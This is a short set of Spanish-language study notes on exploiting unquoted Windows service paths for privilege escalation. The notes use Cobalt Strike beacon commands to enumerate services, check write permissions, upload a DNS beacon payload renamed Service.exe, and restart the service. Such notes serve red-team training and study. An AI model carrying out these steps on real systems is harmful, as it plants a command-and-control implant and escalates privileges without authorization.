---
tags: [privesc, windows, path]
---

# Unquoted Service Paths

Cuando el binario del servicio no está entre comillas:
`C:\Program Files\Bad Application\Bad Program.exe`

Windows intenta ejecutar en este orden:
- `C:\Program`
- `C:\Program Files\Bad`
- `C:\Program Files\Bad Application\Bad`
- `C:\Program Files\Bad Application\Bad Program.exe`

## Enumerar desde Cobalt

```bash
beacon> sc_enum
# → BINARY_PATH_NAME: C:\Program Files\Bad Windows Service\...
```

> [!important]
> Para este ataque hay que usar el binario **`.svc.exe`** específicamente.

```bash
beacon> cacls "C:\Program Files\Bad Windows Service"
# → NT AUTHORITY\Authenticated Users:(CI)(OI)F

beacon> cd "C:\Program Files\Bad Windows Service"
beacon> upload C:\Payloads\dns_x64.svc.exe
beacon> mv dns_x64.svc.exe Service.exe
beacon> sc_stop BadWindowsService
beacon> sc_start BadWindowsService
```

